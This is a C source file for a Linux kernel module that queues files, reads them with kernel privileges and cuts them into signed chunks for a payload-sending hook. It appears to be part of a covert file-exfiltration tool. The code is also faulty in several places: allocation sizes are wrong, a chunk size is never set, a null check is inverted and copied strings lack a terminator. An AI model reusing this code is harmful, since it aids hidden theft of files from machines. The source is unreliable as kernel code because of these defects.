#include "payload_generator.h"
#include "file_info.h"
#include "../chrdev/chrdev.h"

#include <linux/fs.h>

static struct current_file_cache current_file;

void read_file_chunks(struct current_file_cache *current_file)
{
    INIT_LIST_HEAD(&(current_file->chunks));

    mm_segment_t security_old_fs = get_fs();
    set_fs(KERNEL_DS);

    struct file *filp;
    filp = filp_open(current_file->file_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        return;
    }
    
    // TODO: error handling!
    loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
    vfs_llseek(filp, 0, 0);

    // add the trailing signature as it is the first chunk of the file.
    struct new_file_signature signature = {
        .signature = DEFAULT_NEW_FILE_SIGNATURE,
        .file_size = file_size,
    };

    loff_t current_position = 0;
    bool is_first_chunk = true;
    while (current_position != file_size) {
        // allocate new file_chunk struct
        struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk *), GFP_KERNEL);
        if (NULL == new_chunk) {
            goto cleanup;
        }

        // allocate its buffer
        new_chunk->data = (char *)kmalloc(get_default_payload_chunk_size(), GFP_KERNEL);
        if (NULL == new_chunk->data) {
            kfree(new_chunk);
            goto cleanup;
        }
        
        size_t size_to_read = get_default_payload_chunk_size();
        if (is_first_chunk) {
            // if it is the first one - add a signature
            struct new_file_signature signature = {
                .signature = DEFAULT_NEW_FILE_SIGNATURE,
                .file_size = file_size
            };

            memcpy(new_chunk->data, &signature, sizeof(struct new_file_signature));

            size_to_read -= sizeof(struct new_file_signature);
        }

        // TODO: error handling
        kernel_read(filp, (void *)new_chunk->data, (size_t)size_to_read, (loff_t)&current_position);

        current_position += size_to_read;

        list_add(&new_chunk->l_head, &(current_file->chunks));
    }

cleanup:
    filp_close(filp, NULL);
    set_fs(security_old_fs);
}

void initialize_file_data_cache(struct current_file_cache *current_file)
{
    current_file->position = 0;
    current_file->file_path = NULL;
    INIT_LIST_HEAD(&(current_file->chunks));
}

void process_next_pending_file(struct current_file_cache *current_file)
{
    // re-initialize the new file cache
    initialize_file_data_cache(current_file);
    
    // check if the list is empty.
    mutex_lock(&pending_files_to_be_sent_mutex);
    bool is_list_empty = list_empty(&pending_files_to_be_sent);
    mutex_unlock(&pending_files_to_be_sent_mutex);
    if (is_list_empty) {
        return;    
    }

    // free the previous file path as we are going to process the next one
    if (NULL != current_file->file_path) {
        kfree(current_file->file_path);
    }

    // if it is not empty, read its first entry.
    mutex_lock(&pending_files_to_be_sent_mutex);

    struct file_info *next_pending_file;

    next_pending_file = list_first_entry_or_null(&pending_files_to_be_sent, struct file_info, l_head);
    if (NULL == next_pending_file) {
        // remove the item from the list of pending files.
        // also, free it as we are responsible for its memory.
        list_del(&next_pending_file->l_head);
        goto release_mutex;
    }

    // update the file path
    size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
    current_file->file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
    if (NULL == current_file->file_path) {
        // if we fail to allocate space for the file path - skip the deletion of the entry
        // so we will be able to reach it in the next time. if we'll delete it right now - 
        // then the file won't be sent.
        goto release_mutex;
    }
    memcpy(current_file->file_path, next_pending_file->file_path, next_pending_file_path_length);

    // remove the item from the list of pending files.
    // also, free it as we are responsible for its memory.
    list_del(&next_pending_file->l_head);
    kfree(next_pending_file);

    // release the mutex before reading file chunks to avoid mutex starvation.
    mutex_unlock(&pending_files_to_be_sent_mutex);

    // now we need to fill the file_data_cache struct with both the file's metadata and chunks/
    // TODO: support saving only X chunks (for dealing with large files)
    read_file_chunks(current_file);

    return;

release_mutex:
    mutex_unlock(&pending_files_to_be_sent_mutex);
    return;
}

int generate_payload(char *buffer, size_t *length)
{
    if (NULL == buffer || NULL == length) {
        // invalid arguments received
        return -EINVAL;
    }

    if (NULL == current_file.file_path) {
        // no files to read. try to process the next one.
        // if there are files to process, then the next time this function will be called
        // there will be payloads to send.
        process_next_pending_file(&current_file);
        return -EIO;
    }

    if (!list_empty(&current_file.chunks)) {
        // there are chunks to send. read the first chunk, remove it from the list and return it
        // to the caller.   
        struct file_chunk *next_chunk;
        next_chunk = list_first_entry_or_null(&current_file.chunks, struct file_chunk, l_head);
        if (NULL == next_chunk) {
            return -EIO;
        }

        // TODO: 1. who will free the chunk? skb_free?
        // copy the chunk to the caller's buffer.
        memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
        *length = next_chunk->chunk_size;

        // remove the chunk from the list.
        list_del(&(next_chunk->l_head));
    } else {
        // if there are no more chunks to send, it means that we finished sending the file.
        // in this case we would like to process the next pending file and start sending    
        // its payloads.
        process_next_pending_file(&current_file);
    }

    return 0;
}

void setup_payload_generator(void)
{
    // TODO: make atomic!
    get_payload_func = &generate_payload;
    
    // get the first file from the list.
    process_next_pending_file(&current_file);
}

size_t get_default_payload_chunk_size(void)
{
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}